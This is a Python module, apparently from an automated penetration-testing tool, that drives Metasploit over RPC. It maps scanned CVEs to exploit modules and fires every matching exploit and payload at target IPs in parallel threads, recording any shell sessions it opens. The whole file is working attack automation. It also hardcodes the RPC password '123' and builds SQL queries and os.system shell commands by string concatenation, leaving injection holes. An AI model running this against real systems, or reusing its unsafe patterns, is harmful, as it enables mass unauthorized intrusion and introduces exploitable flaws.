import socket
import os
from exploitation.pymetasploit3_updated.msfrpc import MsfRpcClient
# from pymetasploit3.msfrpc import MsfRpcClient
import sqlite3
import signal
import re
import threading
import json
import concurrent.futures
import threading
import random
import utilities


HEADER = '\033[95m'
OKBLUE = '\033[94m'
OKCYAN = '\033[96m'
OKGREEN = '\033[92m'
WARNING = '\033[93m'
FAIL = '\033[91m'
ENDC = '\033[0m'
BOLD = '\033[1m'
UNDERLINE = '\033[4m'

class Exploitation:

    def __init__(self, user_id, ws, info_gathering):

        self.user_id = user_id
        self.web_socket = ws
        self.info_gathering = info_gathering
        self.interface = info_gathering.interface

        self.module = 'exploitation'

        self.is_connected_to_msfrpcd = None
        self.msf_rpc_client = None
        self.msfrpcd_password = '123'
        self.vulns_list = []
        self.re_msf_exploit_search = r'\d+(\s{2})exploit(.+)'
        self.session_found_re = r'(session \d+ created in the background)|(command shell session \d+ opened)'
        self.exploits_list = []
        self.exploits_list_for_db = []
        self.exploitation_status = None
        self.exploitation_db_path = './exploitation.db'
        self.results_db_path = 'results.db'

        self.lhost = utilities.getHostIP(self.interface)

        self.lock = threading.Lock()

        self.ip_exploit_count = 0

        self.total_exploits = 0

        self.exploits_count_for_progress = 0


    def connect_to_msfrpcd(self):

        if not self.is_connected_to_msfrpcd:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

            try:
                value = s.connect_ex(('0.0.0.0', 55553)) == 0

                if not value:
                    try:
                        cmd = 'msfrpcd -n -P ' + self.msfrpcd_password
                        os.system(cmd)
                        self.is_connected_to_msfrpcd = True
                    except Exception as e:
                        print('[*] Failed to connect to msfrpcd')
                else:
                    print("[*] Server is already running")

                    try:
                
                        # iterating through each instance of the process
                        for line in os.popen("ps ax | grep msfrpcd | grep -v grep"):
                            fields = line.split()
                            
                            # extracting Process ID from the output
                            pid = fields[0]
                            
                            # terminating process
                            os.kill(int(pid), signal.SIGKILL)
                        print("Process Successfully terminated")

                        try:
                            cmd = 'msfrpcd -n -P ' + self.msfrpcd_password
                            os.system(cmd)
                            self.is_connected_to_msfrpcd = True
                        except Exception as e:
                            print('[*] Failed to connect to msfrpcd')
                            
                    except:
                        print("Error Encountered while running script")


                if self.msf_rpc_client is None:
                    self.msf_rpc_client = MsfRpcClient(self.msfrpcd_password, ssl=True)

                self.msf_rpc_client.sessions.list.clear()

            except Exception as e:
                print(e)

            if self.is_connected_to_msfrpcd:
                tempDict = dict(user_id=self.user_id, eventType='exploitation_module_status', data={'is_msf_service_started':True})

            else:
                tempDict = dict(user_id=self.user_id, eventType='exploitation_module_status', data={'is_msf_service_started':False})
            
            self.web_socket.send(json.dumps(tempDict))

    
    def identify_session_id_from_db(self, session_data):
        ip = session_data['ip']
        port = session_data['port']
        exploit = session_data['exploit']
        payload = session_data['payload']

        conn = sqlite3.connect(self.exploitation_db_path)
        cursor = conn.cursor()
        query = 'SELECT session_id from sessions where session_host = "{0}" AND via_exploit="{1}" AND via_payload="{2}" AND session_port="{3}"'.format(ip, exploit, payload, port)
        cursor.execute(query)
        sessions_id = cursor.fetchone()[0]

        return sessions_id
        
    def interact_with_session(self, session_data):
        
        exploit = session_data['exploit']
        payload = session_data['payload']
        ip = session_data['ip']
        port = int(session_data['port'])
        lhost = self.lhost
        
        cmd = 'python3 ./exploitation/terminal_interaction.py ' + exploit + ' ' + payload + ' ' + ip + ' ' + str(port) + ' ' + lhost

        sys_cmd = "xterm -e 'sh -c \"{}; exec bash\"'".format(cmd)
        os.system(sys_cmd)

    def read_vulnerability_information_from_results_db(self,ips_list):
        
        try:
            conn = sqlite3.connect(self.results_db_path)
        except Exception as e:
            print('[*] Failed to connect to results.db ',e)
            exit()

        cursor = conn.cursor()

        for ip in ips_list:

            ip_vulns_list = []

            query = 'SELECT ip, port, cve_id, cvss_v2, cvss_v2_severity, cvss_v3, cvss_v3_severity, service from vulnerabilities where ip = "' + ip['ip'] + '";'

            cursor.execute(query)
            
            ports_results = cursor.fetchall()
            
            for result in ports_results:
                
                cvss_v2 = result[3]
                cvss_v2_severity = result[4]
                cvss_v3 = result[5]
                cvss_v3_severity = result[6]

                # if cvss_v3 != -1 and cvss_v3 > 5.0:
                #     ports_dict = dict(port=result[1], cve=result[2], service=result[5])
                #     ip_vulns_list.append(ports_dict)
                
                # elif cvss_v2 > 5.0:
                #     ports_dict = dict(port=result[1], cve=result[2], service=result[5])
                if cvss_v3_severity != '':
                    severity = cvss_v3_severity
                elif cvss_v2_severity != '':
                    severity = cvss_v2_severity
                else:
                    severity = 'INFO'
                
                ports_dict = dict(port=result[1], cve=result[2], service=result[7], severity=severity)
                ip_vulns_list.append(ports_dict)

            tempDict = dict(ip=ip['ip'], vulnerabilities=ip_vulns_list)

            self.vulns_list.append(tempDict)
            


    def read_ip_sessions_from_db(self, ip):

        if self.exploitation_status == 'started' or self.exploitation_status == 'finished':
            conn = sqlite3.connect(self.exploitation_db_path)
            cursor = conn.cursor()
            query = 'SELECT * from sessions where rhost = "' + ip['ip'] + '";'
            cursor.execute(query)
            sessions_result = cursor.fetchall()
            
            try:
                results_db_conn = sqlite3.connect(self.results_db_path)
            except Exception as e:
                print('[*] Failed to connect to results.db ',e)
                exit()
                
            results_db_cursor = results_db_conn.cursor()

            
            ip_sessions_list = []
            for session in sessions_result:

                # service_version_query = 'SELECT service_version_display from ports where dest_host = "{0}" and port = "{1}";'.format(ip['ip'], session[2])
                # results_db_cursor.execute(service_version_query)
                # service_result = results_db_cursor.fetchone()[0]

                tempDict = dict(session_id=session[0], port=session[2], port_service=session[3], exploit=session[4], payload=session[5], status=session[6])
                ip_sessions_list.append(tempDict)

            if len(ip_sessions_list) > 0:
                tempDict2 = dict(ip=ip['ip'], session=ip_sessions_list)
                
                tempDict3 = dict(user_id=self.user_id, eventType='requested_ip_exploits_data_sent', data=tempDict2)
                
                self.web_socket.send(json.dumps(tempDict3))

    def search_exploits(self):
        
        print('[*] Searching Exploits')
        res = self.msf_rpc_client.call('console.create')
        if 'id' in res:
            console_id = res['id']
            
            for ip in self.vulns_list:

                ip_exploits = []

                for cve in ip['vulnerabilities']:
                    cve_id = cve['cve']
                    port = cve['port']
                    service = cve['service']
                    severity = cve['severity']

                    search_cmd = 'search ' + cve_id + '\n'
                    clear_cmd = 'clear\n'
                    
                    # self.msf_rpc_client.call('console.write', [console_id, search_cmd])

                    # res = self.msf_rpc_client.call('console.read',[console_id])

                    console_id = self.msf_rpc_client.consoles.console().cid
                    console = self.msf_rpc_client.consoles.console(console_id)
                    console.write(search_cmd)
                    res = console.read()

                    cve_exploits = []
                    if 'Matching Modules' in res['data']:
                        msf_exploits_res = res['data'].split('\n')

                        for line in msf_exploits_res:
                            line = line.strip()
                            if re.match(self.re_msf_exploit_search, line):
                                line = ' '.join(line.split())
                                line = line.split(' ', 5)
                                exploit_name = line[1]
                                disclosure = line[2]
                                rank = line[3]
                                check = line[4]
                                description = line[5]
                                
                                tempDict1 = dict(exploit_name=exploit_name, disclosure=disclosure, rank=rank, check=check, description=description)
                                cve_exploits.append(tempDict1)

                                tempDict2 = dict(ip=ip['ip'], port=port, service=service, cve_id=cve_id, severity=severity, exploit_name=exploit_name)
                                self.exploits_list_for_db.append(tempDict2)

                    self.total_exploits += len(cve_exploits)
                    tempDict2 = dict(port=port, service=service, cve_id=cve_id, cve_exploits=cve_exploits)
                    ip_exploits.append(tempDict2)

                    # self.msf_rpc_client.call('console.write', [console_id, clear_cmd])
                    console.write(clear_cmd)

                tempDict3 = dict(ip=ip['ip'], exploits=ip_exploits)
                self.exploits_list.append(tempDict3)


    def write_exploits_info_to_results_db(self):
        
        con = sqlite3.connect(self.results_db_path)
        cur = con.cursor()
        try:
            cur.execute('''CREATE TABLE if not exists found_exploits (ip text, port text, service text, cve_id text, severity text, exploit_name text)''')
        except Exception as e:
            print(e)

        insert_cmd = '''insert into found_exploits values (:ip, :port, :service, :cve_id, :severity, :exploit_name)'''
        cur = con.cursor()
        cur.executemany(insert_cmd, self.exploits_list_for_db)
        con.commit()
        con.close()

    def create_exploit_db(self):

        if os.path.exists(self.exploitation_db_path):
            os.remove(self.exploitation_db_path)

        con = sqlite3.connect(self.exploitation_db_path)
        cur = con.cursor()

        # Create table
        try:
            cur.execute('''CREATE TABLE if not exists sessions (session_id text, rhost text, rport text, service text, exploit text, payload text, status text)''')
        except Exception as e:
            print(e)
        
    
    def send_session_found_to_server(self, tempDict):
         
        data = dict(eventType='session_found', data=tempDict)
        self.web_socket.send(json.dumps(data))


    def send_ip_exploit_progress_to_server(self, ip, ip_exploit_progress):

        tempDict = dict(user_id=self.user_id, eventType='ip_exploits_progress', data={'ip':ip, 'progress':ip_exploit_progress})                
        self.web_socket.send(json.dumps(tempDict))



    def launch_exploit_thread_for_payload(self, cve_exploit, ip, port, service):

        exploit_status = None

        self.exploits_count_for_progress += 1        

        exploit_name = cve_exploit['exploit_name'].split('/',1)[1]
                        
        print('[*] Checking ' + exploit_name)
        
        # if exploit_name == 'unix/irc/unreal_ircd_3281_backdoor':
        exploit = self.msf_rpc_client.modules.use('exploit', exploit_name)
        
        exploit_required_arguments = exploit.missing_required

        exploit_run_options = exploit.runoptions
        
        for exploit_argument in exploit_required_arguments:

            if exploit_argument == 'RHOSTS':
                exploit['RHOSTS'] = ip
            elif exploit_argument == 'SESSION':
                exploit['SESSION'] = True
            elif exploit_argument == 'RPORT':
                exploit['RPORT'] = port
            elif exploit_argument == 'HNAME':
                exploit['HNAME'] = self.lhost

        for exploit_ops in exploit_run_options:
            if exploit_ops == 'RPORT':
                exploit['RPORT'] = int(port)   

        target_payloads = exploit.targetpayloads()
        
        for payload in target_payloads:
            
            payload_name = payload

            payload = self.msf_rpc_client.modules.use('payload', payload_name)

            missing_payloads = payload.missing_required
            
            if missing_payloads == ['LHOST']:
                payload['LHOST'] = self.lhost
            
            elif missing_payloads == ['RPORT']:
                payload['RPORT'] = port

            elif missing_payloads == ['RHOSTS']:
                payload['RHOSTS'] = ip    

            elif missing_payloads == ['PATH']:
                payload['PATH'] = True

            elif missing_payloads == ['CMD']:
                payload['CMD'] = False

            elif missing_payloads == ['HNAME']:
                payload['HNAME'] = self.lhost

            if 'LPORT' in payload.options:
                payload['LPORT'] = random.randint(10000,20000)
                
            
            # exploit.execute(payload=payload)

            console_id = self.msf_rpc_client.consoles.console().cid
            console = self.msf_rpc_client.consoles.console(console_id)
            exploit_status_full_output = console.run_module_with_output(exploit, payload=payload)
            
            
            # with self.lock:
                # print('*******************************')
                # print(exploit_status_full_output)
                # print('*******************************')
            exploit_status_output = exploit_status_full_output.split('\n')

            exploit_status_output = str(exploit_status_output[-2]).lower()

            exploit_status_session_match = re.search(self.session_found_re, exploit_status_output)

            if exploit_status_session_match:

                exploit_status = 'success'

                session_id = re.findall(r'\d+', exploit_status_output)
                session_id = session_id[0]

                self.ip_exploit_count += 1

                tempDict = dict(session_id=session_id, rhost=ip, rport=port, service=service, exploit=exploit_name, payload=payload_name, exploit_count=self.ip_exploit_count, status='success')
                
                self.send_session_found_to_server(tempDict)

                self.insert_session_info_to_db(tempDict)

                break

        print('[*] Finished Checking ' + exploit_name)

        if exploit_status != 'success':

            self.ip_exploit_count += 1
            tempDict = dict(session_id=-1, rhost=ip, rport=port, service=service, exploit=exploit_name, payload='None', exploit_count=self.ip_exploit_count, status='failed')
            self.insert_session_info_to_db(tempDict)
            data = dict(eventType='ip_exploit_count', data=tempDict)
            self.web_socket.send(json.dumps(data))
        
        try:
            ip_exploit_progress = round((self.exploits_count_for_progress/self.total_exploits) * 100, 2)
        except:
            ip_exploit_progress = 0

        with self.lock:
            print(OKGREEN + '[*] ' + str(ip_exploit_progress) + ' %' + ENDC)

        self.send_ip_exploit_progress_to_server(ip, ip_exploit_progress)


    def launch_exploit_thread_for_ip(self, ip_exploits):
        
        self.ip_exploit_count = 0

        self.exploits_count_for_progress = 0

        ip = ip_exploits['ip']

        print('[*] Total exploits for ' + ip + ': ' + str(self.total_exploits))
        
        for cve_exploits in ip_exploits['exploits']:
            
            port = cve_exploits['port']

            service = cve_exploits['service']

            if len(cve_exploits['cve_exploits']) > 0:

                print('--------------------------------')
                print('[*] Trying exploits for port {0}'.format(port))
                print('--------------------------------')

            with concurrent.futures.ThreadPoolExecutor(8) as executor:
                for cve_exploit in cve_exploits['cve_exploits']:

                    # exploit_name = cve_exploit['exploit_name'].split('/',1)[1]
                    # if exploit_name == 'unix/irc/unreal_ircd_3281_backdoor':
                    executor.submit(self.launch_exploit_thread_for_payload, cve_exploit, ip, port, service)

                            
                    
                    
    def launch_exploits(self):

        print('[*] Launching Exploits')

        with concurrent.futures.ThreadPoolExecutor(3) as executor:
            threads = []
            for ip_exploits in self.exploits_list:
                threads.append(executor.submit(self.launch_exploit_thread_for_ip, ip_exploits))
            
            for thread in concurrent.futures.as_completed(threads): # Wait for all the threads to finish
                thread.result() 
        
        
        print('[*] Exploitation Finished')
        self.exploitation_status = 'finished'

        self.sub_module = ''
        event_type = 'exploitation_finished'
        self.info_gathering.send_module_start_finish_time_to_server(event_type, self.module, self.sub_module)

                        

    def insert_session_info_to_db(self, session_data):

        session_data = (session_data['session_id'], session_data['rhost'], session_data['rport'], session_data['service'], session_data['exploit'], session_data['payload'], session_data['status'])
 
        con = sqlite3.connect(self.exploitation_db_path)
        insert_cmd = '''insert into sessions values (?, ?, ?, ?, ?, ?, ?)'''
        cur = con.cursor()
        cur.execute(insert_cmd, session_data)
        con.commit()
        con.close()


    def start_exploitation(self, ips_list):

        if self.info_gathering.information_gathering_status == 'Finished' and \
           self.info_gathering.vulnerability_scanning_status == 'Finished':
            if self.is_connected_to_msfrpcd:
                print('[*] Exploitation Started')

                self.exploitation_status = 'started'
                
                self.sub_module = ''
                event_type = 'exploitation_started'
                self.info_gathering.send_module_start_finish_time_to_server(event_type, self.module, self.sub_module)


                self.create_exploit_db()

                self.read_vulnerability_information_from_results_db(ips_list)

                self.search_exploits()

                self.write_exploits_info_to_results_db()

                launch_exploits_thread = threading.Thread(target=self.launch_exploits)
                launch_exploits_thread.start()

            else:
                print('[*] Exploitation Could not be started')